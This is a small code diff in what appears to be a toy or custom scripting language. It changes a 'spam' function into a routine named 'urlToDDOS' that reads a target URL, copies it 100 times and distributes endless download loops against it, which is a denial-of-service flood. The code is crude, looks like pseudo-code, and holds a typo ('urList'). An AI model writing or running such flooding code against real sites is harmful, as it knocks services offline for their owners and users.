@@ -1,12 +1,13 @@
 
-spam = url -> {
+urlToDDOS = read();
+
+urlList = [];
+for (i = 0; i < 100; i = i+1) {
+	urlList = List.add(urList, urlToDDOS);
+}
+
+distribute(urlList, url -> {
 	while(true) {
 		download(url);
 	}
-};
-
-url = read();
-
-
-
-distribute()
+});
